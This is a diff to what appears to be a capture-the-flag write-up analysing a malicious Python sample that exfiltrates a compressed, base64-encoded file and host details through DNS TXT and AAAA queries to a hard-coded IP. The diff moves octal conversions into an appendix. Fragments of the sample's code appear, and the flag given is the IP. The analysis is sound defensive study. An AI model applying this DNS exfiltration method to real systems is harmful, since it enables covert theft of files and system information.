@@ -87,7 +87,15 @@ from base64 import urlsafe_b64encodefrom io import BytesIOfrom dns.message impor
 f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"_ = f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"q(source, 0o34)
 ```
 
-We can see that this code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS (0o65 = octal 65 = decimal 53).
-It reads and compresses a file, encodes it as base64, and splits it into chunks. Those chunks get embedded in DNS TXT queries (0o20 = octal 20 = decimal 16 = TXT record type; specific decimal numbers are assigned to represent different DNS record types, and 16 corresponds to TXT). System information gets sent in a DNS AAAA query (0o34 = octal 34 = decimal 28 = AAAA record type).
+We can see that this code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as base64, and splits it into chunks. Those chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
 
 **Flag:** ```251.91.13.37```
+
+## Appendix
+
+Octal number conversions:
+
+- 0o65 = octal 65 = decimal 53 - port 53 is a common port for DNS
+Note that specific decimal numbers are assigned to represent different DNS record types.
+- 0o20 = octal 20 = decimal 16 = TXT record type
+- 0o34 = octal 34 = decimal 28 = AAAA record type
